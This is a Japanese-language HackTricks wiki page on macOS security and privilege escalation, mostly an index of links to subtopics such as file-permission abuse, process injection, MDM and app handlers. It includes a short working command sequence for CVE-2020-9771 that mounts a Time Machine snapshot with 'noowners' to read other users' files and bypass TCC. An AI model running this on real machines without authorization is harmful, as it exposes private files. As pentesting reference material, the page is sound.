# macOSセキュリティと特権エスカレーション

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

<figure><img src="../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**HackenProofをフォロー**](https://bit.ly/3xrrDrL) **して、web3のバグについてもっと学びましょう**

🐞 web3のバグチュートリアルを読む

🔔 新しいバグバウンティについて通知を受ける

💬 コミュニティディスカッションに参加する

## 基本的なMacOS

MacOSに慣れていない場合は、MacOSの基礎を学ぶことから始めるべきです：&#x20;

* 特別なMacOSの**ファイルと権限:**

{% content-ref url="macos-files-folders-and-binaries/" %}
[macos-files-folders-and-binaries](macos-files-folders-and-binaries/)
{% endcontent-ref %}

* 一般的なMacOSの**ユーザー**

{% content-ref url="macos-users.md" %}
[macos-users.md](macos-users.md)
{% endcontent-ref %}

* **AppleFS**

{% content-ref url="macos-applefs.md" %}
[macos-applefs.md](macos-applefs.md)
{% endcontent-ref %}

* **カーネルのアーキテクチャ**

{% content-ref url="mac-os-architecture/" %}
[mac-os-architecture](mac-os-architecture/)
{% endcontent-ref %}

* 一般的なMacOSの**ネットワークサービスとプロトコル**

{% content-ref url="macos-protocols.md" %}
[macos-protocols.md](macos-protocols.md)
{% endcontent-ref %}

### MacOS MDM

企業では、**MacOSシステムはおそらくMDMで管理**されることが多いです。したがって、攻撃者の視点からは、**それがどのように機能するか**を知ることが興味深いです：

{% content-ref url="../macos-red-teaming/macos-mdm/" %}
[macos-mdm](../macos-red-teaming/macos-mdm/)
{% endcontent-ref %}

### MacOS - 検査、デバッグ、およびFuzzing

{% content-ref url="macos-apps-inspecting-debugging-and-fuzzing/" %}
[macos-apps-inspecting-debugging-and-fuzzing](macos-apps-inspecting-debugging-and-fuzzing/)
{% endcontent-ref %}

## MacOSセキュリティ保護

{% content-ref url="macos-security-protections/" %}
[macos-security-protections](macos-security-protections/)
{% endcontent-ref %}

## 攻撃対象

### ファイルの権限

**rootとして実行されているプロセスが**ユーザーによって制御可能なファイルを書き込む場合、ユーザーはこれを悪用して**特権をエスカレーション**することができます。\
これは次の状況で発生する可能性があります：

* ユーザーによって既に作成されたファイル（ユーザーが所有）
* グループによって書き込み可能なファイル
* ユーザーが所有するディレクトリ内のファイル（ユーザーがファイルを作成できる）
* rootが所有するディレクトリ内のファイルであり、ユーザーがグループによる書き込みアクセス権を持っている（ユーザーがファイルを作成できる）

**rootが使用するファイル**を**作成**できるようになると、ユーザーはその内容を利用したり、別の場所を指すために**シンボリックリンク/ハードリンク**を作成したりすることができます。

このような脆弱性をチェックする際には、**脆弱な`.pkg`インストーラー**を確認することを忘れないでください：

{% content-ref url="macos-files-folders-and-binaries/macos-installers-abuse.md" %}
[macos-installers-abuse.md](macos-files-folders-and-binaries/macos-installers-abuse.md)
{% endcontent-ref %}

### 権限と特権の乱用によるエンタイトルメント

プロセスが**特権やエンタイトルメントのある別のプロセスにコードをインジェクト**したり、特権アクションを実行するためにそれに接触したりできる場合、特権をエスカレーションし、[Sandbox](macos-security-protections/macos-sandbox/)や[TCC](macos-security-protections/macos-tcc/)などの防御策を回避することができます。

{% content-ref url="macos-proces-abuse/" %}
[macos-proces-abuse](macos-proces-abuse/)
{% endcontent-ref %}

### ファイル拡張子とURLスキームアプリハンドラ

ファイル拡張子によって登録された奇妙なアプリは悪用される可能性があり、異なるアプリケーションが特定のプロトコルを開くために登録されることがあります。

{% content-ref url="macos-file-extension-apps.md" %}
[macos-file-extension-apps.md](macos-file-extension-apps.md)
{% endcontent-ref %}
## MacOS特権エスカレーション

### CVE-2020-9771 - mount\_apfs TCCバイパスと特権エスカレーション

**どのユーザーでも**（特権を持たないユーザーでも）タイムマシンのスナップショットを作成し、マウントすることができ、そのスナップショットの**すべてのファイルにアクセス**することができます。\
必要なのは、使用されるアプリケーション（例：`Terminal`）が**フルディスクアクセス**（FDA）アクセス（`kTCCServiceSystemPolicyAllfiles`）を持つための特権のみであり、これは管理者によって許可される必要があります。

{% code overflow="wrap" %}
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
{% endcode %}

より詳しい説明は[**元のレポート**](https://theevilbit.github.io/posts/cve\_2020\_9771/)にあります。

### 機密情報

{% content-ref url="macos-files-folders-and-binaries/macos-sensitive-locations.md" %}
[macos-sensitive-locations.md](macos-files-folders-and-binaries/macos-sensitive-locations.md)
{% endcontent-ref %}

### Linux Privesc

まず、**Linux/Unixに影響を与える特権昇格に関するほとんどのトリックは、MacOSマシンにも影響を与えます**。したがって、以下を参照してください：

{% content-ref url="../../linux-hardening/privilege-escalation/" %}
[privilege-escalation](../../linux-hardening/privilege-escalation/)
{% endcontent-ref %}

## MacOSの防御アプリ

## 参考文献

* [**OS X Incident Response: Scripting and Analysis**](https://www.amazon.com/OS-Incident-Response-Scripting-Analysis-ebook/dp/B01FHOHHVS)
* [**https://taomm.org/vol1/analysis.html**](https://taomm.org/vol1/analysis.html)
* [**https://github.com/NicolasGrimonpont/Cheatsheet**](https://github.com/NicolasGrimonpont/Cheatsheet)
* [**https://assets.sentinelone.com/c/sentinal-one-mac-os-?x=FvGtLJ**](https://assets.sentinelone.com/c/sentinal-one-mac-os-?x=FvGtLJ)
* [**https://www.youtube.com/watch?v=vMGiplQtjTY**](https://www.youtube.com/watch?v=vMGiplQtjTY)

<figure><img src="../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**HackenProofをフォロー**](https://bit.ly/3xrrDrL) **して、web3のバグについてもっと学びましょう**

🐞 web3のバグのチュートリアルを読む

🔔 新しいバグバウンティについて通知を受ける

💬 コミュニティディスカッションに参加する

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？ HackTricksであなたの会社を宣伝したいですか？または、最新バージョンのPEASSにアクセスしたり、HackTricksをPDFでダウンロードしたりしたいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！**
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)、私たちの独占的な[**NFT**](https://opensea.io/collection/the-peass-family)コレクションを発見してください
* [**公式のPEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れる
* **[💬](https://emojipedia.org/speech-balloon/) Discordグループ**に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で**私**を**フォロー**[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **ハッキングのトリックを共有するには、**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **にPRを提出してください。**

</details>
